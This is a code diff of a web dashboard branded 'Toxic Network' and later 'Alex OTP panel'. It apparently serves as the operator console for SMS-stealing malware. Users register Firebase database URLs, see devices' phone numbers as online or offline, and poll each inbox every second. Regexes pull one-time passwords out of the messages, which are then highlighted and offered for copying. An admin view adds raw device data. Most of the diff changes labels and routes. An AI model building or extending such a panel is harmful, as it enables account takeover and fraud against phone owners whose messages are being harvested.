-    c = c.trim();
-    if(c.indexOf(name + '=') === 0){ try{ return JSON.parse(decodeURIComponent(c.substring(name.length + 1))); }catch(e){ return []; } }
-  }
-  return [];
-}
-function setCookie(name, value, days){
-  const expires = new Date(Date.now() + days * 864e5).toUTCString();
-  document.cookie = name + '=' + encodeURIComponent(JSON.stringify(value)) + '; expires=' + expires + '; path=/; SameSite=Lax';
-}
-function saveMyFirebases(){ setCookie(COOKIE_NAME, myFirebases, 365); }
-
-function toast(text){
-  const t = document.getElementById('toast'); t.textContent = text; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 2500);
-}
-
-function playOtpSound(){
-  try{
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    [880, 1100, 880].forEach((freq, i) => {
-      const osc = ctx.createOscillator(); const gain = ctx.createGain();
-      osc.connect(gain); gain.connect(ctx.destination); osc.frequency.value = freq;
-      const t = ctx.currentTime + i * 0.2;
-      gain.gain.setValueAtTime(0.2, t); gain.gain.exponentialRampToValueAtTime(0.001, t + 0.18);
-      osc.start(t); osc.stop(t + 0.18);
-    });
-  }catch(e){}
-}
-function askNotificationPermission(){
-  if(notifPermissionAsked) return; notifPermissionAsked = true;
-  if('Notification' in window && Notification.permission === 'default'){ Notification.requestPermission(); }
-}
-function showOtpNotification(otp, from, message){
-  toast('🔔 OTP: ' + otp + ' — ' + from); playOtpSound();
   if('Notification' in window && Notification.permission === 'granted'){
     try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\n' + message.slice(0, 100), tag: 'otp-' + otp }); setTimeout(()=>n.close(), 10000); }catch(e){}
   }
@@ -1688,14 +1631,15 @@ async function checkConn(){
   try{
     const r = await fetch('/api/conn'); const d = await r.json();
     const badge = document.getElementById('conn-badge'); const txt = document.getElementById('conn-text');
-    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'LIVE'; }
-    else { badge.className = 'conn offline'; txt.textContent = 'OFF'; }
+    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'Live'; }
+    else { badge.className = 'conn offline'; txt.textContent = 'Off'; }
   }catch(e){}
 }
 
 async function manualRefresh(){
   const btn = document.getElementById('refresh-btn');
-  btn.classList.add('spinning'); toast('🔄 REFRESHING...');
+  btn.classList.add('spinning');
+  toast('🔄 Refreshing...');
   if(myFirebases.length > 0){ await loadNumbers(); }
   setTimeout(()=>btn.classList.remove('spinning'), 1200);
 }
@@ -1707,63 +1651,92 @@ function renderMyFirebases(){
     <div class="my-fb-card">
       <div class="fb-icon">🔥</div>
       <div class="fb-info">
-        <div class="fb-label">FIREBASE #${i+1}</div>
+        <div class="fb-label">Firebase #${i+1}</div>
         <div class="fb-hash">ID: ${escapeHtml(fb.hash || 'hidden')}</div>
       </div>
-      <div class="fb-actions"><button onclick="removeFirebase(${i})">🗑 REMOVE</button></div>
-    </div>`).join('');
+      <div class="fb-actions"><button onclick="removeFirebase(${i})">🗑 Remove</button></div>
+    </div>
+  `).join('');
 }
 
-function toggleBulk(){ const a = document.getElementById('bulk-area'); a.style.display = (a.style.display === 'block') ? 'none' : 'block'; }
+function toggleBulk(){
+  const a = document.getElementById('bulk-area');
+  a.style.display = (a.style.display === 'block') ? 'none' : 'block';
+}
 
 async function addFirebase(){
   const input = document.getElementById('fb-url');
   let url = input.value.trim();
-  if(!url){ showMsg('add-msg','❌ URL REQUIRED','err'); return; }
+  if(!url){ showMsg('add-msg','❌ URL required','err'); return; }
   if(!url.startsWith('http')) url = 'https://' + url;
   url = url.replace(/\/+$/, '');
-  if(!url.includes('firebase')){ showMsg('add-msg','❌ INVALID FIREBASE URL','err'); return; }
-  if(myFirebases.some(f => f.url === url)){ showMsg('add-msg','⚠️ ALREADY ADDED','err'); return; }
+  if(!url.includes('firebase')){ showMsg('add-msg','❌ Invalid firebase URL','err'); return; }
+  if(myFirebases.some(f => f.url === url)){ showMsg('add-msg','⚠️ Already added','err'); return; }
+
   document.getElementById('add-btn').disabled = true;
-  showMsg('add-msg','⏳ ADDING...','ok');
+  showMsg('add-msg','⏳ Adding...','ok');
+
   try{
-    const r = await fetch('/api/otp/add', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url: url}) });
+    const r = await fetch('/api/otp/add', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({url: url})
+    });
     const d = await r.json();
     if(d.success){
       myFirebases.push({url: url, hash: d.hash || 'hidden', label: 'Firebase #' + (myFirebases.length+1)});
-      saveMyFirebases(); input.value = '';
-      showMsg('add-msg','✅ ADDED (URL HIDDEN)','ok');
-      renderMyFirebases(); loadNumbers();
-    } else { showMsg('add-msg','❌ ' + (d.error || 'ERROR'), 'err'); }
-  }catch(e){ showMsg('add-msg','❌ NETWORK ERROR','err'); }
+      saveMyFirebases();
+      input.value = '';
+      showMsg('add-msg','✅ Added (URL hidden for security)','ok');
+      renderMyFirebases();
+      loadNumbers();
+    } else {
+      showMsg('add-msg','❌ ' + (d.error || 'Error'), 'err');
+    }
+  }catch(e){
+    showMsg('add-msg','❌ Network error','err');
+  }
   document.getElementById('add-btn').disabled = false;
 }
 
 async function bulkAdd(){
   const txt = document.getElementById('fb-bulk').value.trim();
-  if(!txt){ showMsg('add-msg','❌ EMPTY','err'); return; }
+  if(!txt){ showMsg('add-msg','❌ Empty','err'); return; }
+
   const urls = txt.split('\n').map(l=>l.trim()).filter(l=>l.startsWith('http') || l.includes('firebase'));
-  if(!urls.length){ showMsg('add-msg','❌ NO VALID URLS','err'); return; }
-  showMsg('add-msg', `⏳ ADDING ${urls.length}...`, 'ok');
+  if(!urls.length){ showMsg('add-msg','❌ No valid URLs','err'); return; }
+
+  showMsg('add-msg', `⏳ Adding ${urls.length}...`, 'ok');
   let added = 0, skipped = 0, failed = 0;
+
   for(let i=0; i<urls.length; i++){
     let url = urls[i].trim();
     if(!url.startsWith('http')) url = 'https://' + url;
     url = url.replace(/\/+$/, '');
     if(!url.includes('firebase')){ failed++; continue; }
     if(myFirebases.some(f => f.url === url)){ skipped++; continue; }
+
     try{
-      const r = await fetch('/api/otp/add', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({url: url}) });
+      const r = await fetch('/api/otp/add', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({url: url})
+      });
       const d = await r.json();
-      if(d.success){ myFirebases.push({url: url, hash: d.hash || 'hidden', label: 'Firebase #' + (myFirebases.length+1)}); added++; }
-      else { failed++; }
+      if(d.success){
+        myFirebases.push({url: url, hash: d.hash || 'hidden', label: 'Firebase #' + (myFirebases.length+1)});
+        added++;
+      } else { failed++; }
     }catch(e){ failed++; }
+
     showMsg('add-msg', `⏳ ${i+1}/${urls.length}`, 'ok');
   }
-  saveMyFirebases(); renderMyFirebases();
+
+  saveMyFirebases();
+  renderMyFirebases();
   document.getElementById('fb-bulk').value = '';
   document.getElementById('bulk-area').style.display = 'none';
-  showMsg('add-msg', `✅ ADDED: ${added} · SKIP: ${skipped} · FAIL: ${failed}`, 'ok');
+  showMsg('add-msg', `✅ Added: ${added} · Skip: ${skipped} · Fail: ${failed}`, 'ok');
   loadNumbers();
 }
 
@@ -1776,25 +1749,37 @@ function showMsg(id, text, type){
 
 function removeFirebase(idx){
   if(!confirm('Remove this firebase from YOUR browser?')) return;
-  myFirebases.splice(idx, 1); saveMyFirebases(); renderMyFirebases();
+  myFirebases.splice(idx, 1);
+  saveMyFirebases();
+  renderMyFirebases();
   if(myFirebases.length === 0){
     allNumbers = []; numbers = [];
     document.getElementById('list-content').classList.add('hidden');
     document.getElementById('loading-text').classList.remove('hidden');
-    document.getElementById('loading-msg').textContent = 'ADD A FIREBASE TO START...';
-  } else { loadNumbers(); }
-  toast('✅ REMOVED');
+    document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
+  } else {
+    loadNumbers();
+  }
+  toast('✅ Removed');
 }
 
-function setLocalFilter(f){ if(localFilter === f){ localFilter = 'all'; } else { localFilter = f; } updateFilterButtons(); applyLocalFilter(); renderNumbers(); }
+function setLocalFilter(f){
+  if(localFilter === f){ localFilter = 'all'; }
+  else { localFilter = f; }
+  updateFilterButtons();
+  applyLocalFilter();
+  renderNumbers();
+}
+
 function updateFilterButtons(){
   document.getElementById('btn-online').classList.toggle('active-filter', localFilter === 'online');
   document.getElementById('btn-offline').classList.toggle('active-filter', localFilter === 'offline');
-  let titleText = '◉ ALL NUMBERS';
-  if(localFilter === 'online') titleText = '● ONLINE';
-  else if(localFilter === 'offline') titleText = '● OFFLINE';
+  let titleText = '📱 All Numbers';
+  if(localFilter === 'online') titleText = '🟢 Online';
+  else if(localFilter === 'offline') titleText = '🔴 Offline';
   document.getElementById('list-title').innerHTML = titleText + ' <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span>';
 }
+
 function applyLocalFilter(){
   if(localFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
   else if(localFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
@@ -1806,15 +1791,23 @@ async function loadNumbers(){
   if(myFirebases.length === 0){
     document.getElementById('list-content').classList.add('hidden');
     document.getElementById('loading-text').classList.remove('hidden');
-    document.getElementById('loading-msg').textContent = 'ADD A FIREBASE TO START...';
+    document.getElementById('loading-msg').textContent = 'Add a firebase to start...';
     return;
   }
   document.getElementById('loading-text').classList.remove('hidden');
-  document.getElementById('loading-msg').innerHTML = '<span class="spinner"></span>LOADING...';
+  document.getElementById('loading-msg').innerHTML = '<span class="spinner"></span>Loading...';
+
   try{
-    const r = await fetch('/api/otp/data', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({urls: myFirebases.map(f => f.url)}) });
+    const r = await fetch('/api/otp/data', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({urls: myFirebases.map(f => f.url)})
+    });
     const d = await r.json();
-    if(!d.success){ document.getElementById('loading-msg').textContent = '❌ ' + (d.error || 'ERROR'); return; }
+    if(!d.success){
+      document.getElementById('loading-msg').textContent = '❌ ' + (d.error || 'Error');
+      return;
+    }
     allNumbers = d.numbers || [];
     document.getElementById('s-total').textContent = d.total || 0;
     document.getElementById('s-online').textContent = d.online || 0;
@@ -1823,35 +1816,48 @@ async function loadNumbers(){
     document.getElementById('q-dev').textContent = allNumbers.length;
     document.getElementById('badge-online').textContent = d.online || 0;
     document.getElementById('badge-offline').textContent = d.offline || 0;
+
     applyLocalFilter();
     document.getElementById('loading-text').classList.add('hidden');
     document.getElementById('list-content').classList.remove('hidden');
     const sig = allNumbers.length + '|' + (d.online || 0) + '|' + localFilter;
     if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
-  }catch(e){ document.getElementById('loading-msg').textContent = '❌ NETWORK ERROR'; }
+  }catch(e){
+    document.getElementById('loading-msg').textContent = '❌ Network error';
+  }
 }
 
+// ✅ PERSONAL OTP: Raw Data button NAHI
 function renderNumbers(){
   const q = (document.getElementById('search-num').value || '').toLowerCase();
   const box = document.getElementById('num-list');
-  const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
-  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 NO NUMBERS FOUND</div>'; return; }
+  const filtered = numbers.filter(n => !q ||
+    (n.number||'').toLowerCase().includes(q) ||
+    (n.device_name||'').toLowerCase().includes(q));
+  if(filtered.length === 0){
+    box.innerHTML = '<div class="empty">📭 No numbers found</div>';
+    return;
+  }
   box.innerHTML = filtered.map(n => {
     const isOnline = n.online === true;
     const isUnknown = (n.number || '').startsWith('UNKNOWN-');
     const iconCls = isUnknown ? 'gray' : (isOnline ? '' : 'red');
     const badgeCls = isOnline ? 'badge-online' : 'badge-offline';
-    const badgeTxt = isOnline ? 'ONLINE' : 'OFFLINE';
+    const badgeTxt = isOnline ? 'Online' : 'Offline';
     const titleCls = isUnknown ? 'unknown' : '';
     return `
       <div class="num-card">
-        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '?' : '◉'}</div>
+        <div class="num-icon ${iconCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})">${isUnknown ? '❓' : '📶'}</div>
         <div class="num-info" onclick="openInboxGlobal(${numbers.indexOf(n)})">
           <div class="num-title ${titleCls}">${escapeHtml(n.number)}</div>
-          <div class="num-sub"><span class="pill">✉ ${n.msg_count} SMS</span>${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}</div>
+          <div class="num-sub">
+            <span class="pill">📨 ${n.msg_count} SMS</span>
+            ${n.otp_count > 0 ? `<span class="pill otp">🔑 ${n.otp_count} OTP</span>` : ''}
+          </div>
         </div>
         <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
-      </div>`;
+      </div>
+    `;
   }).join('');
 }
 
@@ -1866,43 +1872,59 @@ async function openInbox(n){
   inboxNumEl.textContent = n.number;
   if((n.number || '').startsWith('UNKNOWN-')){ inboxNumEl.className = 'inbox-num unknown'; }
   else { inboxNumEl.className = 'inbox-num'; }
-  const statusEl = document.getElementById('inbox-status');
-  const statusTxt = document.getElementById('inbox-status-text');
-  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'ONLINE'; }
-  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'OFFLINE'; }
-  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> LOADING...</div>';
+  const statusEl = document.getElementById('inbox-status'); const statusTxt = document.getElementById('inbox-status-text');
+  if(n.online === true){ statusEl.className = 'inbox-status'; statusTxt.textContent = 'Online'; }
+  else { statusEl.className = 'inbox-status offline'; statusTxt.textContent = 'Offline'; }
+  document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Loading...</div>';
   await loadInbox(false);
   if(refreshTimer) clearInterval(refreshTimer);
   refreshTimer = setInterval(()=>loadInbox(false), 1000);
 }
 
 function findTopNumber(msgs){
-  const counter = {}; const senderNums = new Set();
-  msgs.forEach(m => { const found = (m.from || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || []; found.forEach(n => senderNums.add(n)); });
+  const counter = {};
+  const senderNums = new Set();
   msgs.forEach(m => {
-    const found = (m.message || '').match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
-    found.forEach(n => { if(senderNums.has(n)) return; if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return; counter[n] = (counter[n] || 0) + 1; });
+    const from = m.from || '';
+    const found = from.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
+    found.forEach(n => senderNums.add(n));
+  });
+  msgs.forEach(m => {
+    const text = m.message || '';
+    const found = text.match(/(?<!\d)([6-9]\d{9})(?!\d)/g) || [];
+    found.forEach(n => {
+      if(senderNums.has(n)) return;
+      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
+      counter[n] = (counter[n] || 0) + 1;
+    });
   });
   let topNum = null, topCount = 0;
-  for(const [num, cnt] of Object.entries(counter)){ if(cnt > topCount){ topNum = num; topCount = cnt; } }
+  for(const [num, cnt] of Object.entries(counter)){
+    if(cnt > topCount){ topNum = num; topCount = cnt; }
+  }
   return topNum ? {number: topNum, count: topCount} : null;
 }
 
 function updateTopNumberBadge(msgs){
   const badge = document.getElementById('top-number-badge');
   const top = findTopNumber(msgs);
-  if(top && top.count >= 2){ document.getElementById('tn-num').textContent = '📞 ' + top.number; document.getElementById('tn-count-badge').textContent = top.count + 'x'; badge.classList.remove('hidden'); }
-  else { badge.classList.add('hidden'); }
+  if(top && top.count >= 2){
+    document.getElementById('tn-num').textContent = '📞 ' + top.number;
+    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
+    badge.classList.remove('hidden');
+  } else {
+    badge.classList.add('hidden');
+  }
 }
 
 async function loadInbox(showLoader){
   if(!currentNum) return;
-  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> REFRESHING...</div>'; }
+  if(showLoader){ document.getElementById('sms-container').innerHTML = '<div class="empty"><span class="spinner"></span> Refreshing...</div>'; }
   const controller = new AbortController(); const timeoutId = setTimeout(() => controller.abort(), 15000);
   try{
     const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase) + '&id=' + encodeURIComponent(currentNum.device_id) + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
     clearTimeout(timeoutId); const d = await r.json();
-    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error || 'ERROR') + '</div>'; return; }
+    if(!d.success){ document.getElementById('sms-container').innerHTML = '<div class="empty">❌ ' + (d.error || 'Error') + '</div>'; return; }
     const msgs = d.messages || []; allInboxMsgs = msgs;
     if(msgs.length > 0){
       const newest = msgs[0];
@@ -1918,26 +1940,37 @@ async function loadInbox(showLoader){
 function timeAgo(ts, now){
   if(!ts) return '';
   const diff = now - ts;
-  if(diff < 10) return 'NOW'; if(diff < 60) return diff + 's';
-  if(diff < 3600) return Math.floor(diff/60) + 'm';
-  if(diff < 86400) return Math.floor(diff/3600) + 'h';
-  return Math.floor(diff/86400) + 'd';
+  if(diff < 10) return 'अभी';
+  if(diff < 60) return `${diff}s पहले`;
+  if(diff < 3600) return `${Math.floor(diff/60)}m पहले`;
+  if(diff < 86400) return `${Math.floor(diff/3600)}h पहले`;
+  return `${Math.floor(diff/86400)}d पहले`;
 }
 
-function highlightPhoneNumbers(text){ return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>'); }
+function highlightPhoneNumbers(text){
+  return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>');
+}
 
 function renderMessages(){
   const box = document.getElementById('sms-container');
   const now = Math.floor(Date.now() / 1000);
-  let msgs = [...allInboxMsgs].sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0)).slice(0, 60);
+  let msgs = [...allInboxMsgs]
+    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
+    .slice(0, 60);
+  
   updateTopNumberBadge(msgs);
-  if(!msgs.length){ box.innerHTML = '<div class="empty">📭 NO SMS</div>'; return; }
+  
+  if(!msgs.length){ box.innerHTML = '<div class="empty">📭 No SMS</div>'; return; }
   box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
     const otp = m.otp || extractOtp(m.message);
     let body;
-    if(otp){ body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`); body = highlightPhoneNumbers(body); }
-    else { body = highlightPhoneNumbers(escapeHtml(m.message)); }
-    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 COPY OTP ${otp}</button>` : '';
+    if(otp){
+      body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`);
+      body = highlightPhoneNumbers(body);
+    } else {
+      body = highlightPhoneNumbers(escapeHtml(m.message));
+    }
+    const copyBtn = otp ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>` : '';
     const ts = m.timestamp || 0; const isFresh = ts >= (now - 120);
     const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
     const timeStr = m.date_string ? m.date_string : fmtTime(ts); const ago = timeAgo(ts, now);
@@ -1945,17 +1978,21 @@ function renderMessages(){
     const hasNumber = /[6-9]\d{9}/.test(m.message || '');
     let typeBadge = '';
     if(otp) typeBadge = '<span class="msg-type-badge otp">OTP</span>';
-    else if(hasNumber) typeBadge = '<span class="msg-type-badge number">NUM</span>';
+    else if(hasNumber) typeBadge = '<span class="msg-type-badge number">📞 NUM</span>';
     return `
       <div class="sms-item ${cls}">
         ${typeBadge}
         <div class="sms-head">
-          <div class="sender">${escapeHtml(m.from || 'UNKNOWN')} ${newBadge}</div>
-          <div style="text-align:right"><div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div><div class="time-ago ${isFresh?'fresh':''}">${ago}</div></div>
+          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
+          <div style="text-align:right">
+            <div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div>
+            <div class="time-ago ${isFresh?'fresh':''}">${ago}</div>
+          </div>
         </div>
         <div class="sms-body">${body}</div>
         ${copyBtn}
-      </div>`;
+      </div>
+    `;
   }).join('') + '</div>';
 }
 
@@ -1969,16 +2006,21 @@ function backToList(){
 function extractOtp(text){
   if(!text) return '';
   const t = String(text);
-  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i); if(m) return m[1];
-  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i); if(m) return m[1];
-  m = t.match(/#(\d{4,8})/); if(m) return m[1];
+  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
+  if(m) return m[1];
+  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
+  if(m) return m[1];
+  m = t.match(/#(\d{4,8})/);
+  if(m) return m[1];
   return '';
 }
 
 function fmtTime(ts){
   if(!ts) return '';
   try{
-    let t = parseInt(ts); if(t > 1e12) t = Math.floor(t/1000); if(t < 1e9) return String(ts);
+    let t = parseInt(ts);
+    if(t > 1e12) t = Math.floor(t/1000);
+    if(t < 1e9) return String(ts);
     const d = new Date(t * 1000);
     const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
     return d.toLocaleString('en-IN', opts).replace(',', ' |');
@@ -1986,15 +2028,20 @@ function fmtTime(ts){
 }
 
 function copyOtp(code){
-  const done = ()=>toast('✅ COPIED: ' + code);
+  const done = ()=>toast('✅ Copied: ' + code);
   if(navigator.clipboard){ navigator.clipboard.writeText(code).then(done).catch(()=>{ const ta = document.createElement('textarea'); ta.value = code; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); done(); }); }
 }
 
 function escapeHtml(s){ return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
 
 try{
-  const raw = getCookie(COOKIE_NAME) || getCookie("toxic_personal_firebases") || [];
-  if(Array.isArray(raw)){ myFirebases = raw.map(x => typeof x === 'string' ? {url: x, hash: 'hidden', label: 'Firebase'} : x); }
+  const raw = getCookie(COOKIE_NAME) || getCookie("alex_personal_firebases") || [];
+  if(Array.isArray(raw)){
+    myFirebases = raw.map(x => {
+      if(typeof x === 'string') return {url: x, hash: 'hidden', label: 'Firebase'};
+      return x;
+    });
+  }
 }catch(e){ myFirebases = []; }
 
 renderMyFirebases();
@@ -2009,19 +2056,21 @@ setInterval(()=>{ if(myFirebases.length > 0 && !currentNum) loadNumbers(); }, 10
 
 
 # ==================== ADMIN DASHBOARD ====================
+# ✅ Admin version: Firebases count + Raw Data button
 ADMIN_DASHBOARD_HTML = USER_DASHBOARD_HTML.replace(
-    '<div class="nav"><a href="/" class="nav-link active">◉ NUMBERS</a><a href="/otp" class="nav-link otp">◈ PERSONAL OTP</a></div>',
-    '<div class="nav"><a href="/supermasteradmin/dashboard" class="nav-link active">◉ NUMBERS</a><a href="/supermasteradmin/firebases" class="nav-link">🔥 FIREBASES</a><a href="/supermasteradmin/security" class="nav-link otp">🔒 SECURITY</a></div>'
+    '<div class="nav"><a href="/" class="nav-link active">📱 Numbers</a><a href="/otp" class="nav-link otp">🔐 Personal OTP</a></div>',
+    '<div class="nav"><a href="/admin/dashboard" class="nav-link active">📱 Numbers</a><a href="/firebases" class="nav-link">🔥 Firebases</a><a href="/admin/security" class="nav-link">🔒 Security</a></div>'
 ).replace(
-    '<div class="brand"><span class="toxic">☣ TOXIC</span> <span class="net">NETWORK</span></div>',
-    '<div class="brand"><span class="toxic">☣ TOXIC</span> <span class="net">NETWORK</span><span style="font-size:9px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;padding:3px 8px;border-radius:4px;margin-left:8px;font-weight:900;vertical-align:middle;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.5)">👑 ROOT</span></div>'
+    'Alex</span> <span class="panel">OTP PANEL',
+    'Alex</span> <span class="panel">ADMIN</span><span style="font-size:10px;background:linear-gradient(135deg,#f59e0b,#ef4444);color:#fff;padding:3px 8px;border-radius:8px;margin-left:6px;font-weight:700;vertical-align:middle">👑</span>'
 ).replace(
-    '<div class="quick"><div class="info">▸ ACTIVE NUMBERS : <b id="q-dev">0</b></div></div>',
+    '<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>',
     '''<div class="quick">
-      <div class="info">▸ FIREBASES : <b id="q-fb">0</b> · NUMBERS : <b id="q-dev">0</b></div>
-      <a href="/supermasteradmin/firebases" style="padding:10px 16px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;text-decoration:none;border-radius:6px;font-size:11px;font-weight:900;min-height:44px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace;box-shadow:0 0 15px rgba(255,56,96,.3)">⚙ MANAGE</a>
+      <div class="info">🔥 Firebases : <b id="q-fb">0</b> &nbsp;·&nbsp; 📱 Numbers : <b id="q-dev">0</b></div>
+      <a href="/firebases" style="padding:10px 16px;background:linear-gradient(135deg,#7c3aed,#a855f7);color:#fff;text-decoration:none;border-radius:10px;font-size:12px;font-weight:600;min-height:44px;display:inline-flex;align-items:center">⚙️ Manage</a>
     </div>'''
 ).replace(
+    # ✅ Admin me Raw Data button add karo
     '''        <div class="${badgeCls}" onclick="openInboxGlobal(${numbers.indexOf(n)})"><span class="dot"></span>${badgeTxt}</div>
       </div>
     `;
@@ -2044,7 +2093,7 @@ function openInboxGlobal(idx){
 function openRawData(idx){
   if(idx < 0 || idx >= numbers.length) return;
   const n = numbers[idx];
-  const url = '/supermasteradmin/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
+  const url = '/debug?fb=' + encodeURIComponent(n.firebase) + '&id=' + encodeURIComponent(n.device_id);
   window.open(url, '_blank');
 }
 
@@ -2053,269 +2102,116 @@ function openInboxGlobal(idx){
   openInbox(numbers[idx]);
 }'''
 ).replace(
+    # ✅ Admin: loadNumbers me firebase count update
     '''    document.getElementById('q-dev').textContent = allNumbers.length;''',
     '''    document.getElementById('q-dev').textContent = allNumbers.length;
     if(document.getElementById('q-fb')) document.getElementById('q-fb').textContent = d.firebases_total || 0;'''
 ).replace(
+    # ✅ Admin ke liye raw-btn CSS add karo
     '''.arrow{color:#cbd5e1;font-size:20px}''',
     '''.arrow{color:#cbd5e1;font-size:20px}
 .card-actions{display:flex;gap:6px;flex-shrink:0}
-.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;border:none;border-radius:6px;font-size:11px;font-weight:900;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.3)}
+.raw-btn{padding:8px 10px;background:linear-gradient(135deg,#f59e0b,#f97316);color:#fff;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer;min-height:36px;display:inline-flex;align-items:center;gap:4px}
 .raw-btn:active{transform:scale(.94)}'''
 )
 
 
-# ==================== SECURITY HTML (with panel toggle) ====================
+# ==================== SECURITY HTML ====================
 SECURITY_HTML = r"""<!DOCTYPE html>
-<html lang="en"><head><meta charset="UTF-8"><title>Toxic Network — Security</title>
+<html lang="en"><head><meta charset="UTF-8"><title>Security — Alex Admin</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<meta name="theme-color" content="#ff3860">
-<style>""" + HACKER_BASE_CSS + r"""
-body{background:#0a0e1a;color:#e0e6ff;padding:0 0 40px;background-image:radial-gradient(ellipse at top,#1a0a0e 0%,#0a0e1a 60%)}
-.topbar{background:#0a0e1a;border-bottom:1px solid #1f2937;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top));box-shadow:0 2px 20px rgba(255,56,96,.08)}
-.brand{font-size:16px;font-weight:900;letter-spacing:2px}
-.brand .toxic{background:linear-gradient(90deg,#ff3860,#ff9500);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 0 15px rgba(255,56,96,.3)}
-.brand .root-badge{font-size:9px;background:linear-gradient(135deg,#ff3860,#ff9500);color:#fff;padding:3px 8px;border-radius:4px;margin-left:6px;font-weight:900;letter-spacing:1px;box-shadow:0 0 10px rgba(255,56,96,.5)}
-.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between;margin-top:8px}
-@media(min-width:640px){.nav{order:0;width:auto;margin-top:0}}
-.nav-link{padding:10px 14px;border-radius:8px;text-decoration:none;font-size:11px;font-weight:700;color:#7a85a8;background:#111827;border:1px solid #1f2937;white-space:nowrap;min-height:42px;display:inline-flex;align-items:center;letter-spacing:1px;text-transform:uppercase;font-family:'Courier New',monospace}
-.nav-link:hover{color:#ff3860;border-color:rgba(255,56,96,.3)}
-.nav-link.active{background:linear-gradient(135deg,#ff3860,#ff9500);color:#0a0e1a;border-color:transparent;box-shadow:0 0 15px rgba(255,56,96,.4)}
